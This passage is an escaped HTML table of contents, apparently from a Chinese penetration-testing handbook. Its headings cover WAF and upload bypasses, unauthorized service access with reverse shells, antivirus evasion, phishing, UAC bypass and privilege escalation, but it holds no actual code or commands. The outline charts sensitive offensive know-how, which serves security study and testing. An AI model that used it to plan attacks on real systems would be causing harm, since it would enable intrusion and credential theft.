href=\"#sql%E6%B3%A8%E5%85%A5%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93\">SQL 注入分块传输</a></li>\n<li><a href=\"#%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BE%9B%E5%8F%AF%E7%94%A8%E7%9A%84tamper\">自动提供可用的 tamper</a></li>\n<li><a href=\"#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE\">垃圾数据</a></li>\n<li><a href=\"#%E4%B8%8A%E4%BC%A0bypass\">上传 bypass</a>\n<ul>\n<li><a href=\"#%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4\">图片文件头</a></li>\n<li><a href=\"#%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87%E5%A4%B4%E6%88%96%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%8C%85%E5%90%AB\">添加图片头或合并图片包含</a></li>\n<li><a href=\"#%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99\">后缀大小写</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A00x09\">文件名前缀加 [0x09]</a></li>\n<li><a href=\"#%E4%B8%8A%E4%BC%A0htaccess\">上传.htaccess</a></li>\n<li><a href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93\">二次渲染</a></li>\n<li><a href=\"#%E4%B8%8A%E4%BC%A0php3php4phtml%E7%AD%89\">上传 php3,php4,phtml 等</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E5%8A%A0data\">文件名后加::$DATA</a></li>\n<li><a href=\"#asp--%E7%A9%BA%E6%A0%BC\">asp . (空格 +.)</a></li>\n<li><a href=\"#php-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9\">php. .(点 + 空格 + 点)</a>)</li>\n<li><a href=\"#%E5%8F%8C%E5%86%99phphpp\">双写 phphpp</a></li>\n<li><a href=\"#00%E6%88%AA%E6%96%AD\">00 截断</a></li>\n<li><a href=\"#%E4%BF%AE%E6%94%B9%E4%B8%80%E4%BA%9B%E5%9B%BA%E5%AE%9A%E7%9A%84%E5%8F%82%E6%95%B0\">修改一些固定的参数</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8E%BB%E6%8E%89%E5%8F%8C%E5%BC%95%E5%8F%B7\">文件名去掉双引号</a></li>\n<li><a href=\"#%E5%8A%A0%E4%B8%80%E4%B8%AAfilename1%E7%9A%84%E5%8F%82%E6%95%B0\">加一个 filename1 的参数</a></li>\n<li><a href=\"#form%E5%8F%98%E9%87%8F%E6%94%B9%E6%88%90form\">form 变量改成 f+orm</a></li>\n<li><a href=\"#%E5%8E%BB%E6%8E%89form-data\">去掉 form-data</a></li>\n<li><a href=\"#%E5%9C%A8content-disposition%E6%88%96form-data%E5%90%8E%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%A9%BA%E6%A0%BC\">在 Content-Disposition 或 form-data; 后添加多个空格</a></li>\n<li><a href=\"#%E5%BC%95%E5%8F%B7%E5%9B%9E%E8%BD%A6\">引号回车</a></li>\n<li><a href=\"#content-type%E5%92%8Ccontent-disposition%E8%B0%83%E6%8D%A2%E4%BD%8D%E7%BD%AE\">Content-Type 和 ConTent-Disposition 调换位置</a></li>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A0%E7%A9%BA%E6%A0%BC\">文件名前缀加空格</a></li>\n<li><a href=\"#name%E5%89%8D%E5%8A%A0%E7%A9%BA%E6%A0%BC\">name 前加空格</a></li>\n<li><a href=\"#form-data%E7%9A%84%E5%89%8D%E5%90%8E%E5%8A%A0%E4%B8%8A\">form-data 的前后加上 +</a></li>\n</ul>\n</li>\n<li><a href=\"#aspiis\">ASP+IIS</a></li>\n<li><a href=\"#aspiisaspxiis\">Asp+iis&amp;aspx+iis</a></li>\n<li><a href=\"#apache\">apache</a></li>\n<li><a href=\"#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97\">大小写 / 关键字</a></li>\n<li><a href=\"#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81\">双重 url 编码</a></li>\n<li><a href=\"#%E5%8F%98%E6%8D%A2%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F\">变换请求方式</a></li>\n<li><a href=\"#hpp%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93\">HPP 参数污染</a></li>\n<li><a href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93\">数据库</a>\n<ul>\n<li><a href=\"#access\">Access</a></li>\n<li><a href=\"#mysql\">Mysql</a></li>\n<li><a href=\"#mssql\">MSSQL</a></li>\n</ul>\n</li>\n<li><a href=\"#waf\">WAF</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">未授权访问</a>\n<ul>\n<li><a href=\"#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">Redis 未授权访问</a>\n<ul>\n<li><a href=\"#%E6%B5%8B%E8%AF%95\">测试</a></li>\n<li><a href=\"#js%E6%89%93%E5%86%85%E7%BD%91\">JS 打内网</a></li>\n<li><a href=\"#%E5%8F%8D%E5%BC%B9shell\">反弹 shell</a></li>\n<li><a href=\"#%E5%86%99shell\">写 shell</a></li>\n<li><a href=\"#ssh\">SSH</a></li>\n<li><a href=\"#redis-rogue-getshell\">redis-rogue-getshell</a></li>\n<li><a href=\"#redis-rogue-server\">redis-rogue-server</a></li>\n<li><a href=\"#redis%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8\">redis 在 windows 下的利用</a></li>\n<li><a href=\"#lua-rce\">Lua RCE</a></li>\n</ul>\n</li>\n<li><a href=\"#jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">Jenkins 未授权访问</a></li>\n<li><a href=\"#mongodb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">MongoDB 未授权访问</a></li>\n<li><a href=\"#zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">ZooKeeper 未授权访问</a></li>\n<li><a href=\"#elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">Elasticsearch 未授权访问</a></li>\n<li><a href=\"#memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">Memcache 未授权访问</a></li>\n<li><a href=\"#hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">Hadoop 未授权访问</a></li>\n<li><a href=\"#docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">Docker 未授权访问</a></li>\n<li><a href=\"#activemq%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">ActiveMQ 未授权访问</a></li>\n<li><a href=\"#jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">JBOSS 未授权访问</a></li>\n</ul>\n</li>\n<li><a href=\"#%E9%98%BF%E9%87%8C%E4%BA%91oss-key%E5%88%A9%E7%94%A8\">阿里云 OSS Key 利用</a></li>\n<li><a href=\"#linux%E7%BB%95%E8%BF%87disable_function\">Linux 绕过 disable_function</a>\n<ul>\n<li><a href=\"#ld_preload\">LD_PRELOAD</a></li>\n<li><a href=\"#php70-73-bypass\">php7.0-7.3 bypass</a></li>\n<li><a href=\"#windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6com%E7%BB%95%E8%BF%87\">windows 系统组件 com 绕过</a></li>\n<li><a href=\"#cgi%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F\">CGI 启动方式</a></li>\n<li><a href=\"#imagemagick%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87\">ImageMagick 组件绕过</a></li>\n<li><a href=\"#%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87\">常规函数绕过</a></li>\n<li><a href=\"#pcntl_exec\">pcntl_exec</a></li>\n<li><a href=\"#imap_open%E5%87%BD%E6%95%B0\">imap_open 函数</a></li>\n<li><a href=\"#php74-ffi%E7%BB%95%E8%BF%87\">php7.4 FFI 绕过</a></li>\n<li><a href=\"#shellshock\">shellshock</a></li>\n<li><a href=\"#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6\">蚁剑插件</a></li>\n</ul>\n</li>\n<li><a href=\"#open_basedir%E7%BB%95%E8%BF%87\">open_basedir 绕过</a></li>\n<li><a href=\"#tomcat-ajp-lfirce\">Tomcat Ajp LFI&amp;RCE\t</a></li>\n<li><a href=\"#mysql%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\">Mysql 连接文件读取</a></li>\n<li><a href=\"#mysql%E5%BC%80%E5%90%AF%E5%A4%96%E8%BF%9E\">Mysql 开启外连</a></li>\n<li><a href=\"#mssqlagent-job%E4%B8%8A%E7%BA%BF\">MSSQL&amp;Agent Job 上线</a></li>\n<li><a href=\"#%E6%B3%A8%E5%85%A5%E6%97%A0%E5%88%97%E5%90%8D\">注入无列名</a></li>\n<li><a href=\"#dnslog\">DNSLog</a>\n<ul>\n<li><a href=\"#%E6%B3%A8%E5%85%A5\">注入</a>\n<ul>\n<li><a href=\"#mysql\">MYSQL</a></li>\n<li><a href=\"#mssql\">MSSQL</a></li>\n<li><a href=\"#postgresql\">postgreSQL</a></li>\n<li><a href=\"#oracle\">Oracle</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\">命令执行</a></li>\n<li><a href=\"#xxe\">XXE</a></li>\n<li><a href=\"#struts\">Struts</a></li>\n<li><a href=\"#weblogic\">weblogic</a></li>\n<li><a href=\"#resin\">Resin</a></li>\n<li><a href=\"#discuz\">Discuz</a></li>\n</ul>\n</li>\n<li><a href=\"#phpmyadmin\">PHPMyadmin</a>\n<ul>\n<li><a href=\"#log\">LOG</a></li>\n<li><a href=\"#%E6%85%A2%E6%9F%A5%E8%AF%A2\">慢查询</a></li>\n<li><a href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\">任意文件读取</a></li>\n<li><a href=\"#lfi\">LFI</a></li>\n<li><a href=\"#rce\">RCE</a></li>\n</ul>\n</li>\n<li><a href=\"#php-fpm-rce\">PHP-FPM RCE</a></li>\n<li><a href=\"#phpstudy%E5%90%8E%E9%97%A8\">phpstudy 后门</a></li>\n<li><a href=\"#cmdhijack\">cmdhijack</a></li>\n</ul>\n</li>\n<li><a href=\"#database\">Database</a>\n<ul>\n<li><a href=\"#mssql\">MSSQL</a></li>\n<li><a href=\"#postgresql\">PostgreSQL</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB\">近源攻击</a>\n<ul>\n<li><a href=\"#wi-fi%E7%A0%B4%E8%A7%A3\">WI-FI 破解</a>\n<ul>\n<li><a href=\"#wifite\">wifite</a></li>\n<li><a href=\"#aircrack-ng\">Aircrack-ng</a></li>\n</ul>\n</li>\n<li><a href=\"#%E9%92%93%E9%B1%BC%E7%BD%91%E7%BB%9C\">钓鱼网络</a>\n<ul>\n<li><a href=\"#hostapd\">Hostapd</a></li>\n<li><a href=\"#hostapd-wpe\">Hostapd-wpe</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%97%A0%E7%BA%BF%E5%B9%B2%E6%89%B0\">无线干扰</a>\n<ul>\n<li><a href=\"#beacon-flood\">Beacon flood</a></li>\n<li><a href=\"#deauth-flood\">Deauth flood</a></li>\n<li><a href=\"#mdk3-destruction\">Mdk3 destruction</a></li>\n<li><a href=\"#wifi%E8%8A%AF%E7%89%87esp8266\">WiFi 芯片 esp8266</a></li>\n<li><a href=\"#mdk4\">Mdk4</a></li>\n<li><a href=\"#cve-2018-4407\">CVE-2018-4407</a></li>\n<li><a href=\"#%E7%BB%95%E8%BF%87mac%E5%9C%B0%E5%9D%80%E8%AE%A4%E8%AF%81\">绕过 mac 地址认证</a>\n<ul>\n<li><a href=\"#ifconfig\">Ifconfig</a></li>\n<li><a href=\"#macchanger\">Macchanger</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#badusb\">BadUSB</a></li>\n<li><a href=\"#%E5%85%8B%E9%9A%86%E5%8D%A1\">克隆卡</a></li>\n<li><a href=\"#%E8%93%9D%E7%89%99\">蓝牙</a></li>\n</ul>\n</li>\n<li><a href=\"#%E9%B1%BC%E5%8F%89%E5%BC%8F%E6%94%BB%E5%87%BB\">鱼叉式攻击</a>\n<ul>\n<li><a href=\"#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6\">钓鱼邮件</a>\n<ul>\n<li><a href=\"#cve\">CVE</a>\n<ul>\n<li><a href=\"#cve-2017-11882\">CVE-2017-11882</a></li>\n<li><a href=\"#cve-2017-0199\">CVE-2017-0199</a></li>\n<li><a href=\"#cve-2012-0158\">CVE-2012-0158</a></li>\n<li><a href=\"#cve-2017-0143\">CVE-2017-0143</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6\">可执行文件</a></li>\n<li><a href=\"#%E6%96%87%E6%A1%A3%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E9%80%A0\">文档文件的伪造</a></li>\n<li><a href=\"#%E6%89%A9%E5%B1%95%E5%90%8D%E5%9B%BE%E6%A0%87\">扩展名 / 图标</a></li>\n<li><a href=\"#%E6%8D%86%E7%BB%91\">捆绑</a></li>\n<li><a href=\"#%E5%AE%8F\">宏</a></li>\n<li><a href=\"#0day\">0day</a></li>\n<li><a href=\"#chm\">CHM</a></li>\n</ul>\n</li>\n<li><a href=\"#%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5\">钓鱼链接</a>\n<ul>\n<li><a href=\"#url%E8%B7%B3%E8%BD%AC\">URL 跳转</a></li>\n<li><a href=\"#%E7%BB%93%E5%90%88%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3%E6%88%96%E7%A8%8B%E5%BA%8F\">结合恶意文档或程序</a></li>\n<li><a href=\"#%E7%9F%ADurl\">短 URL</a></li>\n<li><a href=\"#%E7%BB%93%E5%90%88%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB\">结合水坑攻击</a></li>\n<li><a href=\"#%E7%9B%B8%E4%BC%BC%E5%9F%9F%E5%90%8D\">相似域名</a></li>\n<li><a href=\"#%E5%9F%9F%E5%90%8D%E7%AA%83%E5%8F%96\">域名窃取</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E9%B1%BC%E5%8F%89\">第三方服务鱼叉</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E5%85%8D%E6%9D%80\">免杀</a>\n<ul>\n<li><a href=\"#msf%E5%85%8D%E6%9D%80\">MSF 免杀</a>\n<ul>\n<li><a href=\"#nps_payload\">nps_payload</a></li>\n<li><a href=\"#%E7%BC%96%E7%A0%81%E5%99%A8\">编码器</a></li>\n<li><a href=\"#cc%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80\">c/c++ 源码免杀</a>\n<ul>\n<li><a href=\"#%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C\">指针执行</a></li>\n<li><a href=\"#%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98\">申请动态内存</a></li>\n<li><a href=\"#%E5%B5%8C%E5%85%A5%E6%B1%87%E7%BC%96\">嵌入汇编</a></li>\n<li><a href=\"#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2\">强制类型转换</a></li>\n<li><a href=\"#%E6%B1%87%E7%BC%96%E8%8A%B1%E6%8C%87%E4%BB%A4\">汇编花指令</a></li>\n<li><a href=\"#xor%E5%8A%A0%E5%AF%86\">XOR 加密</a></li>\n<li><a href=\"#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5\">远程线程注入</a></li>\n<li><a href=\"#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%85%8D%E6%9D%80\">加载器免杀</a>\n<ul>\n<li><a href=\"#shellcode_launcher\">shellcode_launcher</a></li>\n<li><a href=\"#ssi%E5%8A%A0%E8%BD%BD\">SSI 加载</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#c%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80\">c# 源码免杀</a>\n<ul>\n<li><a href=\"#%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91\">直接编译</a></li>\n<li><a href=\"#%E5%8A%A0%E5%AF%86%E5%A4%84%E7%90%86\">加密处理</a></li>\n<li><a href=\"#xoraes%E7%BC%96%E7%A0%81\">XOR/AES 编码</a></li>\n<li><a href=\"#cscinstallutil\">CSC+InstallUtil</a></li>\n</ul>\n</li>\n<li><a href=\"#python%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80\">Python 源码免杀</a>\n<ul>\n<li><a href=\"#pyinstaller%E5%8A%A0%E8%BD%BDc%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91\">pyinstaller 加载 C 代码编译</a></li>\n<li><a href=\"#pyinstaller%E5%8A%A0%E8%BD%BDpy%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91\">pyinstaller 加载 py 代码编译 (*)</a></li>\n<li><a href=\"#py2exe%E6%89%93%E5%8C%85exe\">Py2exe 打包 exe</a></li>\n<li><a href=\"#base64%E7%BC%96%E7%A0%81pyinstaller%E6%89%93%E5%8C%85\">Base64 编码 + Pyinstaller 打包</a></li>\n<li><a href=\"#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB\">加载器分离</a>\n<ul>\n<li><a href=\"#hex\">hex</a></li>\n<li><a href=\"#base64\">Base64(*)</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#dll%E5%8A%AB%E6%8C%81\">DLL 劫持</a></li>\n<li><a href=\"#msbuild\">MSBuild</a></li>\n<li><a href=\"#greatsct\">GreatSCT</a></li>\n<li><a href=\"#mshta\">Mshta</a></li>\n<li><a href=\"#installutil\">InstallUtil</a></li>\n<li><a href=\"#veil\">Veil</a></li>\n<li><a href=\"#rc4\">RC4</a></li>\n<li><a href=\"#%E6%8D%86%E7%BB%91\">捆绑</a></li>\n<li><a href=\"#evasion%E6%A8%A1%E5%9D%97\">Evasion 模块</a></li>\n<li><a href=\"#phantom-evasion\">Phantom-Evasion</a></li>\n<li><a href=\"#shellter\">Shellter</a></li>\n<li><a href=\"#the-backdoor-factory\">the-backdoor-factory</a></li>\n<li><a href=\"#zirikatu\">zirikatu</a></li>\n<li><a href=\"#hanzoinjection\">hanzoInjection</a></li>\n</ul>\n</li>\n<li><a href=\"#powershell%E5%85%8D%E6%9D%80\">PowerShell 免杀</a>\n<ul>\n<li><a href=\"#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90\">直接生成</a></li>\n<li><a href=\"#%E5%88%86%E5%9D%97%E5%85%8D%E6%9D%80\">分块免杀</a></li>\n<li><a href=\"#invoke-shellcode%E5%8A%A0%E8%BD%BD\">Invoke-Shellcode 加载</a></li>\n<li><a href=\"#invoke-obfuscation\">Invoke-Obfuscation</a></li>\n<li><a href=\"#xencrypt\">Xencrypt</a></li>\n<li><a href=\"#pyfuscation\">PyFuscation</a></li>\n<li><a href=\"#%E6%8B%86%E5%88%86c%E7%BC%96%E8%AF%91\">拆分 + C 编译</a></li>\n<li><a href=\"#%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B\">行为检测</a></li>\n<li><a href=\"#out-encryptedscript\">Out-EncryptedScript</a></li>\n<li><a href=\"#cobalt-strike-powershell%E5%85%8D%E6%9D%80\">cobalt strike powershell 免杀</a></li>\n</ul>\n</li>\n<li><a href=\"#ruby\">Ruby</a></li>\n<li><a href=\"#golang\">Golang</a>\n<ul>\n<li><a href=\"#%E5%8A%A0%E8%BD%BD%E5%99%A8\">加载器</a>\n<ul>\n<li><a href=\"#go-shellcode\">go-shellcode</a></li>\n<li><a href=\"#gsl\">Gsl</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E5%86%85%E7%BD%91%E5%9F%9F\">内网 &amp; 域</a>\n<ul>\n<li><a href=\"#powershell\">Powershell</a>\n<ul>\n<li><a href=\"#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C\">远程执行</a></li>\n<li><a href=\"#%E5%8A%A0%E8%BD%BDexe\">加载 exe</a></li>\n<li><a href=\"#exe2ps1\">EXE2PS1</a></li>\n<li><a href=\"#%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5\">绕过策略</a>\n<ul>\n<li><a href=\"#base64\">Base64</a></li>\n<li><a href=\"#%E5%86%99%E5%85%A5bat%E7%BB%95%E8%BF%87\">写入 bat 绕过</a></li>\n<li><a href=\"#%E6%8B%BC%E6%8E%A5%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2\">拼接拆分字符串</a></li>\n<li><a href=\"#replace%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0\">Replace 替换函数</a></li>\n<li><a href=\"#http%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87\">HTTP 字符拼接绕过</a></li>\n<li><a href=\"#%E5%9B%BE%E7%89%87%E5%85%8D%E6%9D%80\">图片免杀</a></li>\n<li><a href=\"#%E5%8A%A0%E8%BD%BDshellcode\">加载 shellcode</a></li>\n<li><a href=\"#%E5%8A%A0%E8%BD%BDdll\">加载 dll</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#windows%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6sid\">Windows 安全标识符 (SID)</a></li>\n<li><a href=\"#%E6%8F%90%E6%9D%83\">提权</a>\n<ul>\n<li><a href=\"#impacket%E5%B7%A5%E5%85%B7%E5%8C%85\">Impacket 工具包</a></li>\n<li><a href=\"#windows-exploit-suggester\">Windows-exploit-suggester</a></li>\n<li><a href=\"#wesng\">Wesng</a></li>\n<li><a href=\"#searchsploit\">Searchsploit</a></li>\n<li><a href=\"#%E6%BF%80%E6%B4%BBguest\">激活 guest</a></li>\n<li><a href=\"#mysql-udf\">MYSQL udf</a></li>\n<li><a href=\"#mysql-linux-root\">MYSQL Linux Root</a></li>\n<li><a href=\"#mssql\">MSSQL</a>\n<ul>\n<li><a href=\"#xp_cmdshell\">xp_cmdshell</a></li>\n<li><a href=\"#xp_regwrite\">xp_regwrite</a></li>\n<li><a href=\"#xp_dirtree\">xp_dirtree</a></li>\n<li><a href=\"#sp_oacreate\">sp_oacreate</a></li>\n<li><a href=\"#%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C\">沙盒执行</a></li>\n<li><a href=\"#warsqlkit%E5%90%8E%E9%97%A8\">WarSQLKit (后门)</a></li>\n</ul>\n</li>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#bypass-uac\">Bypass UAC</a>\n<ul>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#dccwbypassuac\">DccwBypassUAC</a></li>\n<li><a href=\"#k8uac\">K8uac</a></li>\n<li><a href=\"#cmstp\">CMSTP</a></li>\n<li><a href=\"#uacme\">Uacme</a></li>\n<li><a href=\"#bypass-uac\">Bypass-UAC</a></li>\n<li><a href=\"#dll-hijack\">DLL hijack</a></li>\n<li><a href=\"#silentcleanup\">SilentCleanup</a></li>\n<li><a href=\"#sdclt\">Sdclt</a>\n<ul>\n<li><a href=\"#1\">1</a></li>\n<li><a href=\"#2\">2</a></li>\n</ul>\n</li>\n<li><a href=\"#makecabwusa\">Makecab&amp;Wusa</a></li>\n<li><a href=\"#clr-bypassuac\">CLR BypassUAC</a></li>\n<li><a href=\"#eventvwr%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8\">eventvwr 劫持注册表</a></li>\n<li><a href=\"#web-delivery\">Web Delivery</a></li>\n<li><a href=\"#invoke-psuacme\">Invoke-PsUACme</a></li>\n</ul>\n</li>\n<li><a href=\"#whitelist%E7%99%BD%E5%90%8D%E5%8D%95\">Whitelist (白名单)</a>\n<ul>\n<li><a href=\"#greatsct\">GreatSCT</a></li>\n<li><a href=\"#jsrat\">JSRat</a></li>\n<li><a href=\"#odbcconfexe\">Odbcconf.exe</a></li>\n<li><a href=\"#msiexecexe\">Msiexec.exe</a></li>\n<li><a href=\"#installutilexe\">InstallUtil.exe</a></li>\n<li><a href=\"#compilerexe\">Compiler.exe</a>\n<ul>\n<li><a href=\"#1xml\">1.xml</a></li>\n<li><a href=\"#1tcp\">1.tcp</a></li>\n</ul>\n</li>\n<li><a href=\"#csc\">Csc</a></li>\n<li><a href=\"#regasm\">Regasm</a></li>\n<li><a href=\"#msbuild\">Msbuild</a></li>\n<li><a href=\"#winrm\">Winrm</a></li>\n<li><a href=\"#mshta\">Mshta</a></li>\n<li><a href=\"#regsvr32\">Regsvr32</a></li>\n<li><a href=\"#rundll32\">Rundll32</a>\n<ul>\n<li><a href=\"#%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6\">执行文件</a></li>\n<li><a href=\"#%E6%97%A0%E5%BC%B9%E7%AA%97%E6%89%A7%E8%A1%8C\">无弹窗执行</a></li>\n<li><a href=\"#%E5%A2%9E%E5%88%A0%E6%B3%A8%E5%86%8C%E8%A1%A8\">增删注册表</a></li>\n<li><a href=\"#%E5%86%99%E6%96%87%E4%BB%B6\">写文件</a></li>\n<li><a href=\"#out-rundllcommand\">Out-RundllCommand</a></li>\n</ul>\n</li>\n<li><a href=\"#dotnettojscript\">DotNetToJScript</a>\n<ul>\n<li><a href=\"#starfighters\">StarFighters</a></li>\n<li><a href=\"#%E7%BB%95%E8%BF%87amsi%E6%89%A7%E8%A1%8C\">绕过 AMSI 执行</a></li>\n</ul>\n</li>\n<li><a href=\"#wmic\">WMIC</a></li>\n<li><a href=\"#msxsl\">Msxsl</a></li>\n<li><a href=\"#cpl\">CPL</a></li>\n</ul>\n</li>\n<li><a href=\"#runas\">Runas</a></li>\n<li><a href=\"#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96\">令牌窃取</a>\n<ul>\n<li><a href=\"#msf\">MSF</a></li>\n<li><a href=\"#cobalt-strike\">Cobalt strike</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%AF%86%E7%A0%81%E7%AA%83%E5%8F%96\">密码窃取</a>\n<ul>\n<li><a href=\"#%E4%BC%AA%E9%80%A0%E9%94%81%E5%B1%8F\">伪造锁屏</a></li>\n<li><a href=\"#%E4%BC%AA%E9%80%A0%E8%AE%A4%E8%AF%81%E6%A1%86\">伪造认证框</a>\n<ul>\n<li><a href=\"#credsleaker\">CredsLeaker</a></li>\n<li><a href=\"#loginprompt\">LoginPrompt</a></li>\n<li><a href=\"#nishang-invoke-credentialsphish\">Nishang-Invoke-CredentialsPhish</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#rottenpotato\">RottenPotato</a></li>\n<li><a href=\"#powerup\">PowerUp</a></li>\n<li><a href=\"#powerup-alwaysinstallelevated\">Powerup-AlwaysInstallElevated</a></li>\n<li><a href=\"#alwaysinstallelevated%E6%8F%90%E6%9D%83\">AlwaysInstallElevated 提权</a></li>\n<li><a href=\"#trusted-service-paths\">Trusted Service Paths</a></li>\n<li><a href=\"#vulnerable-services\">Vulnerable Services</a></li>\n<li><a href=\"#sudo%E6%8F%90%E6%9D%83\">Sudo 提权</a></li>\n<li><a href=\"#linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1\">Linux 计划任务</a></li>\n<li><a href=\"#linux-suid%E6%8F%90%E6%9D%83\">Linux SUID 提权</a>\n<ul>\n<li><a href=\"#find\">Find</a></li>\n<li><a href=\"#nmap\">NMAP</a></li>\n<li><a href=\"#vim\">VIM</a></li>\n<li><a href=\"#bash\">BASH</a></li>\n<li><a href=\"#cpmv\">CP/MV</a></li>\n</ul>\n</li>\n<li><a href=\"#linux-etcpasswd%E6%8F%90%E6%9D%83\">Linux /etc/passwd 提权</a></li>\n<li><a href=\"#linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83\">Linux 脏牛提权</a></li>\n</ul>\n</li>\n<li><a href=\"#rdpfireawall\">RDP&amp;Fireawall</a>\n<ul>\n<li><a href=\"#%E7%88%86%E7%A0%B4\">爆破</a></li>\n<li><a href=\"#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF\">注册表开启</a></li>\n<li><a href=\"#netsh%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1\">NETSH 启动服务</a></li>\n<li><a href=\"#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%BC%80%E5%90%AF\">注入点开启</a></li>\n<li><a href=\"#msf%E5%BC%80%E5%90%AF\">MSF 开启</a></li>\n<li><a href=\"#wmic%E5%BC%80%E5%90%AF\">Wmic 开启</a></li>\n<li><a 